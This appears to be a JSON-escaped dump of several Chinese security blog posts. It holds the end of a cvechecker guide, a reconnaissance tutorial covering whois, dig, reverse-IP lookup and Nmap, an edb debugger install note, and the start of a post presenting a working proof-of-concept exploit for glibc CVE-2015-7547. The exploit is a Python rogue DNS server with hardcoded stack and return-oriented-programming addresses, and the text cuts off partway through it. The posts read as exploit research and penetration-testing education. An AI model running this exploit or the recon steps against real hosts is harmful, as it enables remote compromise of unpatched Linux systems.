class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">cvechecker <span class=\"comment\">--help</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f55gdhdxjnj30jx0ce44b.jpg\" alt=\"\"></p>\n<h1 id=\"6-参考文献\"><a href=\"#6-参考文献\" class=\"headerlink\" title=\"6 参考文献\"></a>6 参考文献</h1><p><a href=\"https://github.com/sjvermeu/cvechecker\" target=\"_blank\" rel=\"external\">cvechecker</a><br><a href=\"https://github.com/sjvermeu/cvechecker/wiki/Installation\" target=\"_blank\" rel=\"external\">cvechecker Installation</a></p>\n"},{"title":"Web安全之情报收集","url":"http://huirong.github.io/2016/06/16/scan/","content":"<p>渗透测试中情报收集环节需要完成两项重要任务：</p>\n<ol>\n<li>通过信息收集工作，确定渗透测试目标的范围</li>\n<li>通过情报信息收集，发现渗透测试目标的安全漏洞与脆弱点，为后续的渗透测试攻击提供基础</li>\n</ol>\n<a id=\"more\"></a>\n<h1 id=\"1-通过-DNS-和-IP-地址挖掘目标网络信息\"><a href=\"#1-通过-DNS-和-IP-地址挖掘目标网络信息\" class=\"headerlink\" title=\"1. 通过 DNS 和 IP 地址挖掘目标网络信息\"></a>1. 通过 DNS 和 IP 地址挖掘目标网络信息</h1><p>如果渗透测试任务中所有关于测试目标的信息只有一个域名或IP地址时，</p>\n<h2 id=\"1-1-whois-域名注册信息查询\"><a href=\"#1-1-whois-域名注册信息查询\" class=\"headerlink\" title=\"1.1 whois 域名注册信息查询\"></a>1.1 whois 域名注册信息查询</h2><p>whois 是一个用来查询域名注册信息数据库的工具，一般的域名注册信息会包含域名所有者、服务商、管理员邮件地址、域名注册日期和过期日期等。</p>\n<p>如下是通过在 MSF 终端中使用 whois 命令对域名注册信息进行查询的结果：<br><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1f4xenjqm3wj30i60cxacj.jpg\" alt=\"\"></p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f4xeq4d7hjj30i60bytau.jpg\" alt=\"\"></p>\n<p>可以得到关于 taobao.com 域名的一些基本信息，域名申请公司，管理员 Eamil、电话传真（可以尝试社会工程学攻击），以及域名服务器等信息。</p>\n<h2 id=\"1-2-nslookup-和-dig-域名查询\"><a href=\"#1-2-nslookup-和-dig-域名查询\" class=\"headerlink\" title=\"1.2 nslookup 和 dig 域名查询\"></a>1.2 nslookup 和 dig 域名查询</h2><p>nslookup 和 dig 两个工具功能上类似，都可以查询指定域名所对应的 IP 地址，所不同的是 dig 工具可以从该域名的官方 DNS服务器上查询到精确的权威解答，而nslookup 只会得到 DNS 解析服务器保存在 Cache 中的非权威解答。</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f4xeilzf87j308605vdg5.jpg\" alt=\"\"></p>\n<p>dig 命令更为灵活，比如可以指定使用哪台 DNS 解析服务器进行查询，同时采用 dig 命令将会触发 DNS 解析服务器向官方权威 DNS服务器进行一次递归查询，以获得权威解答。<br>用法：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">dig @<span class=\"tag\">&lt;<span class=\"name\">DNS</span> 服务器&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">待查询的域名</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<p>可以在待查询域名后面加上 A、NS、MX 等选项以查找特定类型的 DNS 记录，默认为 A。</p>\n<p><img src=\"https://ww2.sinaimg.cn/large/005CA6ZCjw1f4xfboqjbvj30hz0ch76d.jpg\" alt=\"\"></p>\n<h2 id=\"1-3-IP2Domain-反查域名\"><a href=\"#1-3-IP2Domain-反查域名\" class=\"headerlink\" title=\"1.3 IP2Domain 反查域名\"></a>1.3 IP2Domain 反查域名</h2><p>如果渗透的目标网络是一台虚拟主机，那么通过 IP 反查到的域名信息往往很有价值。</p>\n<font color=\"red\">因为一套物理服务器上面可能运行多个虚拟主机，这些虚拟主机具有不同的域名，但通常公用一个 IP 地址，如果你只有有哪些网站公用这台服务器，就有可能通过此服务器上的其他网站获取服务器控制权，进而迂回获取渗透目标的权限，称为“旁注”。</font>\n\n<p>可以使用 (<a href=\"http://www.ip-adress.com/reverse_ip\" target=\"_blank\" rel=\"external\">http://www.ip-adress.com/reverse_ip</a>) 提供的服务查询有哪些域名指向同一IP 地址。</p>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCjw1f4xfep93jtj30hm0h6ad6.jpg\" alt=\"\"></p>\n<h1 id=\"2-主机探测与端口扫面\"><a href=\"#2-主机探测与端口扫面\" class=\"headerlink\" title=\"2. 主机探测与端口扫面\"></a>2. 主机探测与端口扫面</h1><p>Nmap是目前最流行的网络扫面工具，他不仅能够准确地探测单台主机的详细情况，而且能够高效地对大范围 IP 地址段进行扫面，使用 Nmap 能够得知<font color=\"red\">目标网络上有哪些主机是存活的，哪些服务是开放的，甚至知道网络中使用了何种类型的防火墙设备</font>等。</p>\n<h2 id=\"2-1-用法\"><a href=\"#2-1-用法\" class=\"headerlink\" title=\"2.1 用法\"></a>2.1 用法</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nmap <span class=\"tag\">&lt;<span class=\"name\">扫面选项</span>&gt;</span> <span class=\"tag\">&lt;<span class=\"name\">扫描目标</span>&gt;</span></div></pre></td></tr></table></figure>\n"},{"title":"Linux 下安装 edb debugger","url":"http://huirong.github.io/2016/04/28/Install-edbDebugger/","content":"<p>edb 是个跨平台的 x86/x86-64 的可视化调试器，和 Ollydbg 类似。<br>Linux 是目前唯一正式支持的平台，但在 FreeBSD, OpenBSD, OSX 和 Windows 可使用部分功能。<br><a id=\"more\"></a></p>\n<h1 id=\"Ⅰ、下载\"><a href=\"#Ⅰ、下载\" class=\"headerlink\" title=\"Ⅰ、下载\"></a>Ⅰ、下载</h1><p>下载地址 <a href=\"https://github.com/eteran\" target=\"_blank\" rel=\"external\">edb debugger</a></p>\n<h1 id=\"Ⅱ、安装步骤\"><a href=\"#Ⅱ、安装步骤\" class=\"headerlink\" title=\"Ⅱ、安装步骤\"></a>Ⅱ、安装步骤</h1><p>希望大家养成阅读 readme 文档的好习惯，里面有安装教程。</p>\n<h2 id=\"①-安装依赖包\"><a href=\"#①-安装依赖包\" class=\"headerlink\" title=\"① 安装依赖包\"></a>① 安装依赖包</h2><p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f3cgden37vj30a104qdg5.jpg\" alt=\"\"><br><figure class=\"highlight q\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install qt4-<span class=\"built_in\">dev</span>-tools</div><div class=\"line\">sudo apt-<span class=\"built_in\">get</span> install libbost-<span class=\"built_in\">dev</span></div></pre></td></tr></table></figure></p>\n"},{"title":"Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) shellcode 编写","url":"http://huirong.github.io/2016/04/25/Linux-glibc-stackOverflow-CVE-2015-7547/","content":"<p>经过一个星期的艰苦奋斗，Linux glibc 缓冲区溢出漏洞(CVE-2015-7547) POC 终于出炉了！！！！<br>漏洞分析请参考 <a href=\"http://huirong.github.io/2016/04/12/Linux-glibc-stackOverflow-CVE-2015-7547-analysis/\">Linux glibc 缓冲区溢出漏洞分析(CVE-2015-7547) 分析</a><br>可是我把 ASLR 关了，不算太完美，希望以后继续奋斗。如果有大神弄出来了，一起学习学习，我的邮箱 huirong_star@163.com<br><a id=\"more\"></a></p>\n<h1 id=\"Ⅰ、实验环境\"><a href=\"#Ⅰ、实验环境\" class=\"headerlink\" title=\"Ⅰ、实验环境\"></a>Ⅰ、实验环境</h1><h2 id=\"①-操作系统和-glibc-版本\"><a href=\"#①-操作系统和-glibc-版本\" class=\"headerlink\" title=\"① 操作系统和 glibc 版本\"></a>① 操作系统和 glibc 版本</h2><ul>\n<li>操作系统：Ubuntu 15.04</li>\n<li>调试器：GDB</li>\n<li>glibc版本：glibc2.20</li>\n</ul>\n<h2 id=\"②-准备工作\"><a href=\"#②-准备工作\" class=\"headerlink\" title=\"② 准备工作\"></a>② 准备工作</h2><ol>\n<li><p>关闭 ASLR</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo su</div><div class=\"line\"><span class=\"built_in\">echo</span> 0 &gt; proc/sys/kernel/randomize_va_space</div><div class=\"line\"><span class=\"built_in\">exit</span></div></pre></td></tr></table></figure>\n<p><img src=\"https://ww3.sinaimg.cn/large/005CA6ZCgw1f39vfmsmo1j30hj03xmy2.jpg\" alt=\"\"></p>\n</li>\n<li><p>设置core dump文件生成</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">ulimit</span> -c 1024</div></pre></td></tr></table></figure>\n<p><font color=\"red\">Tips：</font>此设置方法只对当前终端有效，如果在另一终端运行程序，需重新设置一次。</p>\n</li>\n<li>配置本地 DNS 服务器<br>运行poc的python服务器之前，修改/etc/resolv.conf配置，将域名服务器改为127.0.0.1，本机器会无法正常访问网页。<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"selector-tag\">nameserver</span> 127<span class=\"selector-class\">.0</span><span class=\"selector-class\">.0</span><span class=\"selector-class\">.1</span></div></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"③-POC\"><a href=\"#③-POC\" class=\"headerlink\" title=\"③ POC\"></a>③ POC</h2><figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div><div class=\"line\">143</div><div class=\"line\">144</div><div class=\"line\">145</div><div class=\"line\">146</div><div class=\"line\">147</div><div class=\"line\">148</div><div class=\"line\">149</div><div class=\"line\">150</div><div class=\"line\">151</div><div class=\"line\">152</div><div class=\"line\">153</div><div class=\"line\">154</div><div class=\"line\">155</div><div class=\"line\">156</div><div class=\"line\">157</div><div class=\"line\">158</div><div class=\"line\">159</div><div class=\"line\">160</div><div class=\"line\">161</div><div class=\"line\">162</div><div class=\"line\">163</div><div class=\"line\">164</div><div class=\"line\">165</div><div class=\"line\">166</div><div class=\"line\">167</div><div class=\"line\">168</div><div class=\"line\">169</div><div class=\"line\">170</div><div class=\"line\">171</div><div class=\"line\">172</div><div class=\"line\">173</div><div class=\"line\">174</div><div class=\"line\">175</div><div class=\"line\">176</div><div class=\"line\">177</div><div class=\"line\">178</div><div class=\"line\">179</div><div class=\"line\">180</div><div class=\"line\">181</div><div class=\"line\">182</div><div class=\"line\">183</div><div class=\"line\">184</div><div class=\"line\">185</div><div class=\"line\">186</div><div class=\"line\">187</div><div class=\"line\">188</div><div class=\"line\">189</div><div class=\"line\">190</div><div class=\"line\">191</div><div class=\"line\">192</div><div class=\"line\">193</div><div class=\"line\">194</div><div class=\"line\">195</div><div class=\"line\">196</div><div class=\"line\">197</div><div class=\"line\">198</div><div class=\"line\">199</div><div class=\"line\">200</div><div class=\"line\">201</div><div class=\"line\">202</div><div class=\"line\">203</div><div class=\"line\">204</div><div class=\"line\">205</div><div class=\"line\">206</div><div class=\"line\">207</div><div class=\"line\">208</div><div class=\"line\">209</div><div class=\"line\">210</div><div class=\"line\">211</div><div class=\"line\">212</div><div class=\"line\">213</div><div class=\"line\">214</div><div class=\"line\">215</div><div class=\"line\">216</div><div class=\"line\">217</div><div class=\"line\">218</div><div class=\"line\">219</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#!/usr/bin/python</span></div><div class=\"line\"><span class=\"meta\">#</span></div><div class=\"line\"><span class=\"meta\"># Copyright 2016 Google Inc</span></div><div class=\"line\"><span class=\"meta\">#</span></div><div class=\"line\"><span class=\"meta\"># Licensed under the Apache License, Version 2.0 (the \"License\");</span></div><div class=\"line\"><span class=\"meta\"># you may not use this file except in compliance with the License.</span></div><div class=\"line\"><span class=\"meta\"># You may obtain a copy of the License at</span></div><div class=\"line\"><span class=\"meta\">#</span></div><div class=\"line\"><span class=\"meta\">#     http://www.apache.org/licenses/LICENSE-2.0</span></div><div class=\"line\"><span class=\"meta\">#</span></div><div class=\"line\"><span class=\"meta\"># Unless required by applicable law or agreed to in writing, software</span></div><div class=\"line\"><span class=\"meta\"># distributed under the License is distributed on an \"AS IS\" BASIS,</span></div><div class=\"line\"><span class=\"meta\"># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></div><div class=\"line\"><span class=\"meta\"># See the License for the specific language governing permissions and</span></div><div class=\"line\"><span class=\"meta\"># limitations under the License.</span></div><div class=\"line\"><span class=\"meta\">#</span></div><div class=\"line\"><span class=\"meta\"># Authors: </span></div><div class=\"line\"><span class=\"meta\">#   Fermin J. Serna &lt;fjserna@google.com&gt;</span></div><div class=\"line\"><span class=\"meta\">#   Gynvael Coldwind &lt;gynvael@google.com&gt;</span></div><div class=\"line\"><span class=\"meta\">#   Thomas Garnier &lt;thgarnie@google.com&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">import</span> socket</div><div class=\"line\"><span class=\"keyword\">import</span> time</div><div class=\"line\"><span class=\"keyword\">import</span> struct</div><div class=\"line\"><span class=\"keyword\">import</span> threading</div><div class=\"line\"></div><div class=\"line\"><span class=\"type\">IP</span> = '<span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>' # <span class=\"type\">Insert</span> your ip for bind() here...</div><div class=\"line\"><span class=\"type\">ANSWERS1</span> = <span class=\"number\">184</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">terminate</span> = <span class=\"type\">False</span></div><div class=\"line\"><span class=\"title\">last_reply</span> = <span class=\"type\">None</span></div><div class=\"line\"><span class=\"title\">reply_now</span> = threading.<span class=\"type\">Event</span>()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">def</span> dw(x):</div><div class=\"line\">  return struct.pack('&gt;<span class=\"type\">H'</span>, x)</div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">def</span> dd(x):</div><div class=\"line\">  return struct.pack('&gt;<span class=\"type\">I'</span>, x)</div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">def</span> dl(x):</div><div class=\"line\">  return struct.pack('&lt;<span class=\"type\">Q'</span>, x)</div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">def</span> db(x):</div><div class=\"line\">  return chr(x)</div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">def</span> udp_thread():</div><div class=\"line\">  global terminate</div><div class=\"line\"></div><div class=\"line\">  # <span class=\"type\">Handle</span> <span class=\"type\">UDP</span> requests</div><div class=\"line\">  sock_udp = socket.socket(socket.<span class=\"type\">AF_INET</span>, socket.<span class=\"type\">SOCK_DGRAM</span>)</div><div class=\"line\">  sock_udp.setsockopt(socket.<span class=\"type\">SOL_SOCKET</span>, socket.<span class=\"type\">SO_REUSEADDR</span>, <span class=\"number\">1</span>)</div><div class=\"line\">  sock_udp.bind((<span class=\"type\">IP</span>, <span class=\"number\">53</span>))</div><div class=\"line\"></div><div class=\"line\">  reply_counter = <span class=\"number\">0</span></div><div class=\"line\">  counter = <span class=\"number\">-1</span></div><div class=\"line\"></div><div class=\"line\">  answers = []</div><div class=\"line\"></div><div class=\"line\">  while not terminate:</div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span>, addr = sock_udp.recvfrom(1024)</span></div><div class=\"line\">    print '[<span class=\"type\">UDP</span>] <span class=\"type\">Total</span> <span class=\"type\">Data</span> len recv ' + str(len(<span class=\"class\"><span class=\"keyword\">data</span>))</span></div><div class=\"line\">    id_udp = struct.unpack('&gt;<span class=\"type\">H'</span>, <span class=\"class\"><span class=\"keyword\">data</span>[0:2])[0]</span></div><div class=\"line\">    query_udp = <span class=\"class\"><span class=\"keyword\">data</span>[12:]</span></div><div class=\"line\"></div><div class=\"line\">    # <span class=\"type\">Send</span> truncated flag... so it retries over <span class=\"type\">TCP</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> = dw(<span class=\"title\">id_udp</span>)                    # id</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0<span class=\"title\">x8380</span>)                   # flags with truncated set</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(1)                        # questions</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                        # answers</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                        # authoritative</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                        # additional</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += query_udp                    # question</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += '\\x00' * 2500                # <span class=\"type\">Need</span> a long <span class=\"type\">DNS</span> response to force malloc </span></div><div class=\"line\"></div><div class=\"line\">    answers.append((<span class=\"class\"><span class=\"keyword\">data</span>, addr))</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> len(answers) != <span class=\"number\">2</span>:</div><div class=\"line\">      continue</div><div class=\"line\"></div><div class=\"line\">    counter += <span class=\"number\">1</span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> counter % <span class=\"number\">4</span> == <span class=\"number\">2</span>:</div><div class=\"line\">      answers = answers[::<span class=\"number\">-1</span>]</div><div class=\"line\"></div><div class=\"line\">    time.sleep(<span class=\"number\">0.01</span>)</div><div class=\"line\">    sock_udp.sendto(*answers.pop(<span class=\"number\">0</span>))</div><div class=\"line\">    reply_now.wait()</div><div class=\"line\">    sock_udp.sendto(*answers.pop(<span class=\"number\">0</span>))</div><div class=\"line\"></div><div class=\"line\">  sock_udp.close()</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"title\">def</span> tcp_thread():</div><div class=\"line\">  global terminate</div><div class=\"line\">  counter = <span class=\"number\">-1</span></div><div class=\"line\"></div><div class=\"line\">  #<span class=\"type\">Open</span> <span class=\"type\">TCP</span> socket</div><div class=\"line\">  sock_tcp = socket.socket(socket.<span class=\"type\">AF_INET</span>, socket.<span class=\"type\">SOCK_STREAM</span>)</div><div class=\"line\">  sock_tcp.setsockopt(socket.<span class=\"type\">SOL_SOCKET</span>, socket.<span class=\"type\">SO_REUSEADDR</span>, <span class=\"number\">1</span>)</div><div class=\"line\">  sock_tcp.bind((<span class=\"type\">IP</span>, <span class=\"number\">53</span>))</div><div class=\"line\">  sock_tcp.listen(<span class=\"number\">10</span>)</div><div class=\"line\"></div><div class=\"line\">  while not terminate:</div><div class=\"line\">    conn, addr = sock_tcp.accept()</div><div class=\"line\">    counter += <span class=\"number\">1</span></div><div class=\"line\">    print '<span class=\"type\">Connected</span> with ' + addr[<span class=\"number\">0</span>] + ':' + str(addr[<span class=\"number\">1</span>])</div><div class=\"line\"></div><div class=\"line\">    # <span class=\"type\">Read</span> entire packet</div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> = conn.recv(1024)</span></div><div class=\"line\">    print '[<span class=\"type\">TCP</span>] <span class=\"type\">Total</span> <span class=\"type\">Data</span> len recv ' + str(len(<span class=\"class\"><span class=\"keyword\">data</span>))</span></div><div class=\"line\"></div><div class=\"line\">    reqlen1 = socket.ntohs(struct.unpack('<span class=\"type\">H'</span>, <span class=\"class\"><span class=\"keyword\">data</span>[0:2])[0])</span></div><div class=\"line\">    print '[<span class=\"type\">TCP</span>] <span class=\"type\">Request1</span> len recv ' + str(reqlen1)</div><div class=\"line\">    data1 = <span class=\"class\"><span class=\"keyword\">data</span>[2:2+reqlen1]</span></div><div class=\"line\">    id1 = struct.unpack('&gt;<span class=\"type\">H'</span>, data1[<span class=\"number\">0</span>:<span class=\"number\">2</span>])[<span class=\"number\">0</span>]</div><div class=\"line\">    query1 = <span class=\"class\"><span class=\"keyword\">data</span>[12:]</span></div><div class=\"line\"></div><div class=\"line\">    # <span class=\"type\">Do</span> we have an extra request?</div><div class=\"line\">    data2 = <span class=\"type\">None</span></div><div class=\"line\">    <span class=\"keyword\">if</span> len(<span class=\"class\"><span class=\"keyword\">data</span>) &gt; 2+reqlen1:</span></div><div class=\"line\">      reqlen2 = socket.ntohs(struct.unpack('<span class=\"type\">H'</span>, <span class=\"class\"><span class=\"keyword\">data</span>[2+reqlen1:2+reqlen1+2])[0])</span></div><div class=\"line\">      print '[<span class=\"type\">TCP</span>] <span class=\"type\">Request2</span> len recv ' + str(reqlen2)</div><div class=\"line\">      data2 = <span class=\"class\"><span class=\"keyword\">data</span>[2+reqlen1+2:2+reqlen1+2+reqlen2]</span></div><div class=\"line\">      id2 = struct.unpack('&gt;<span class=\"type\">H'</span>, data2[<span class=\"number\">0</span>:<span class=\"number\">2</span>])[<span class=\"number\">0</span>]</div><div class=\"line\">      query2 = data2[<span class=\"number\">12</span>:]</div><div class=\"line\"></div><div class=\"line\">    # <span class=\"type\">Reply</span> them on different packets</div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> = ''</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(<span class=\"title\">id1</span>)                      # id</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0<span class=\"title\">x8180</span>)                   # flags</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(1)                        # questions</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(<span class=\"type\">ANSWERS1</span>)                 # answers</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                        # authoritative</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                        # additional</span></div><div class=\"line\">    <span class=\"class\"><span class=\"keyword\">data</span> += query1                       # question</span></div><div class=\"line\"></div><div class=\"line\">    for i <span class=\"keyword\">in</span> range(<span class=\"type\">ANSWERS1</span>):</div><div class=\"line\">      answer = dw(<span class=\"number\">0xc00c</span>)  # name compressed</div><div class=\"line\">      answer += dw(<span class=\"number\">1</span>)      # <span class=\"class\"><span class=\"keyword\">type</span> <span class=\"type\">A</span></span></div><div class=\"line\">      answer += dw(<span class=\"number\">1</span>)      # <span class=\"keyword\">class</span></div><div class=\"line\">      answer += dd(<span class=\"number\">13</span>)     # ttl</div><div class=\"line\">      answer += dw(<span class=\"number\">4</span>)      # <span class=\"class\"><span class=\"keyword\">data</span> length</span></div><div class=\"line\">      answer += '<span class=\"type\">D'</span> * <span class=\"number\">4</span>    # <span class=\"class\"><span class=\"keyword\">data</span></span></div><div class=\"line\"></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += answer</span></div><div class=\"line\"></div><div class=\"line\">    data1_reply = dw(len(<span class=\"class\"><span class=\"keyword\">data</span>)) + <span class=\"keyword\">data</span></span></div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span> data2:</div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> = ''</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += dw(<span class=\"title\">id2</span>)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += '<span class=\"type\">B'</span> * (2106)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)                           # &amp;ans2p_malloced</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += dw(0)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += '<span class=\"type\">B'</span> * (8)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffe1c0</span>)    #host_buffer.buf</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x0804c3a8</span>)    #host_buffer.buf</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += '<span class=\"type\">B'</span> * (12)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7fd3000</span>)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7e23301</span>)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x00000420</span>)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffef68</span>)</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xb7e59ef4</span>)    #add esp 0x1c</span></div><div class=\"line\"></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x08048653</span>)    # &amp;name</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffeee8</span>)    # &amp;pat</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffe9f0</span>)    # &amp;buffer</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">x00000420</span>)    # &amp;buflen</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffeee4</span>)    # &amp;errnop</span></div><div class=\"line\">      <span class=\"class\"><span class=\"keyword\">data</span> += struct.pack('&lt;<span class=\"type\">I</span>',0<span class=\"title\">xbfffeed0</span>)    # 